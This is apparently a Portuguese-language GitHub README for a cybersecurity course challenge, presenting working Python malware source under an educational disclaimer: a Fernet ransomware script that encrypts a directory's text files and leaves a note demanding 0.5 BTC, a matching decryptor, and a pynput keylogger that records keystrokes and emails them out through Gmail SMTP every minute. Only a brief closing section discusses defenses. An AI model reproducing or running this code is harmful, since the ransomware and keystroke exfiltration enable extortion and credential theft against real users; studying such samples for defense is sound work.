# desafio_Rans_Key-dio
```Python
--------------------------------------------------------------------------------
AVISO LEGAL E USO ÉTICO
--------------------------------------------------------------------------------
Estes scripts foram desenvolvidos estritamente para fins EDUCACIONAIS e de PESQUISA em segurança cibernética. O objetivo é demonstrar o funcionamento técnico de ameaças para auxiliar na criação de medidas de defesa e conscientização.
O autor não se responsabiliza pelo uso indevido, ilegal ou danos causados por estes códigos. O uso destes softwares contra sistemas sem autorização prévia e expressa é ILEGAL e punível por lei.
Sempre execute este código em ambientes isolados (Máquinas Virtuais ou Sandboxes).
--------------------------------------------------------------------------------
```

## 1. Ransomware Simulado (Criptografia de Arquivos)
Para este exemplo, utilizaremos a biblioteca cryptography. Ela permite realizar a criptografia simétrica (Fernet), onde a mesma chave que tranca o arquivo é usada para destrancá-lo.
O Fluxo do Código
- Geração da Chave: Cria-se um arquivo secret.key.
- Criptografia: O script lê os arquivos alvo e os sobrescreve com dados cifrados.
- Nota de Resgate: Um arquivo .txt é gerado com as "instruções".

```Python
from cryptography.fernet import Fernet
import os

# 1. Gerar e salvar a chave
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# 2. Carregar a chave
def load_key():
    return open("secret.key", "rb").read()

# 3. Criptografar arquivos em um diretório de teste
def encrypt_files(directory):
    key = load_key()
    f = Fernet(key)
    for file in os.listdir(directory):
        if file.endswith(".txt"): # Alvo apenas arquivos de texto para teste
            with open(f"{directory}/{file}", "rb") as file_to_encrypt:
                data = file_to_encrypt.read()
            encrypted_data = f.encrypt(data)
            with open(f"{directory}/{file}", "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
    
    with open(f"{directory}/RESGATE.txt", "w") as ransom_note:
        ransom_note.write("Seus arquivos foram criptografados! Pague 0.5 BTC para recuperar.")
```
**Arquivo .py:** 'https://github.com/marcoslimaml/desafio_Rans_Key-dio/blob/main/Rans_Cript.py'

## 2. Ransomware Simulado (Descriptografia de Arquivos)
   No código anterior, utilizamos a biblioteca cryptography com o algoritmo Fernet. Para reverter o processo, precisamos exatamente da mesma chave (secret.key) gerada no momento da invasão.
   Este script percorre a pasta de teste, lê os arquivos que foram "sequestrados" e utiliza a chave simétrica para restaurar o conteúdo original.
   
```Python
from cryptography.fernet import Fernet
import os

# 1. Carregar a chave que foi gerada anteriormente
def load_key():
    try:
        return open("secret.key", "rb").read()
    except FileNotFoundError:
        print("Erro: A chave 'secret.key' não foi encontrada. Impossível descriptografar.")
        return None

# 2. Descriptografar arquivos em um diretório
def decrypt_files(directory):
    key = load_key()
    if not key:
        return
        
    f = Fernet(key)
    
    for file in os.listdir(directory):
        # Ignora a própria chave e a nota de resgate
        if file == "secret.key" or file == "RESGATE.txt":
            continue
            
        file_path = os.path.join(directory, file)
        
        if os.path.isfile(file_path):
            try:
                with open(file_path, "rb") as encrypted_file:
                    encrypted_data = encrypted_file.read()
                
                # Reverte a criptografia
                decrypted_data = f.decrypt(encrypted_data)
                
                with open(file_path, "wb") as decrypted_file:
                    decrypted_file.write(decrypted_data)
                
                print(f"Arquivo restaurado: {file}")
            except Exception as e:
                print(f"Falha ao descriptografar {file}: {e}")

# --- EXECUÇÃO ---
if __name__ == "__main__":
    test_dir = "./arquivos_teste" # Certifique-se de que este diretório existe
    decrypt_files(test_dir)
    print("\nProcesso de recuperação concluído.")
```
**Arquivo .py:** 'https://github.com/marcoslimaml/desafio_Rans_Key-dio/blob/main/Rans_Desc.py'

## 3. Keylogger Simulado (Captura de Teclas)
Para o keylogger, a biblioteca pynput é a escolha ideal. Ela monitora eventos de entrada do teclado de forma eficiente.
Este script utiliza uma Thread separada para o timer. Isso garante que o registro das teclas não seja interrompido enquanto o e-mail está sendo enviado.

```Python
import pynput.keyboard
import threading
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class Keylogger:
    def __init__(self, interval_seconds, email, password):
        self.log = "Keylogger iniciado..."
        self.interval = interval_seconds
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def send_mail(self, message):
        # Configurações do servidor Gmail
        smtp_server = "smtp.gmail.com"
        port = 587  # Para starttls
        
        context = ssl.create_default_context()
        try:
            server = smtplib.SMTP(smtp_server, port)
            server.starttls(context=context)
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")

    def report(self):
        # Envia o log e limpa a variável para o próximo ciclo
        if self.log:
            self.send_mail("\n\n" + self.log)
            self.log = ""
        
        # Define o intervalo de repetição (recursivo com timer)
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# --- EXECUÇÃO ---
# Substitua pelos seus dados de teste (Use Senha de App do Google)
if __name__ == "__main__":
    my_keylogger = Keylogger(60, "seu-email@gmail.com", "sua-senha-de-app")
    my_keylogger.start()
```
**Arquivo .py:** 'https://github.com/marcoslimaml/desafio_Rans_Key-dio/blob/main/Key_E-mail.py'

## 4. Reflexão sobre Defesa e Prevenção:
Entender como os códigos acima funcionam nos permite mapear as camadas de defesa necessárias:
- Ameaça: `Ransomware`, `Keylogger`, `Execução´, `Vulnerabilidade`.
- Medida de Prevenção: **Backups Offline**, **Endpoint Detection (EDR)**, **Sandboxing**, **Conscientização**.
- Como funciona: Se os dados forem criptografados, você restaura a versão "fria" (desconectada da rede). Monitora processos que tentam "ouvir" o teclado sem autorização. Executa arquivos suspeitos em um ambiente isolado para observar o comportamento antes de permitir no sistema real. Treinar o usuário para não clicar em anexos .exe ou links suspeitos (Phishing).
